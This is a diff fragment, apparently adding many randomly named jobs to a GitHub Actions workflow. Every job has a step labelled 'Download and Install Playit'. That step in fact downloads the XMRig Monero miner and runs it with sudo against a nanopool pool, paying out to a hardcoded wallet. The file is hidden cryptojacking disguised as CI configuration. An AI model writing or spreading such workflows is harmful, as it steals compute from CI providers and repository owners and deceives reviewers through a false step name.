+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  hhdnmmnbyahwiniiy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ltuzjcmdlawmoizp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  jcmgvdzeikelhaugm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lrihvjhfvaiqqnxm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wqeoycpatgvazczoo:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  yropzpcegkmelzky:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qsrpfjpublcxsxmyf:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  itjhzepojedndwkn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  euojpquzwlihpbxdm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ocqjzngxkhtmbgmw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  zdwzwwvrubcnihalz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  seztslapwrlajnny:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  oihuczdjueybqtezx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  tnsajiijpndreumy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  nnsypxruimbndkkae:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  anqaksydosyrekej:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  lpmbrokbemtrlvqto:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  zfybrzxzaxlbluke:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  gmkumzxbrtmzqzqsz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lsidvxmecwbjxugp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  bqqiiawvfufrjqygi:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  auzsxdkkkwuxvofg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  glbkaxlfifrdnkoqr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ezjtprytslfobmwc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  zuowyyqchrqyptoiz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
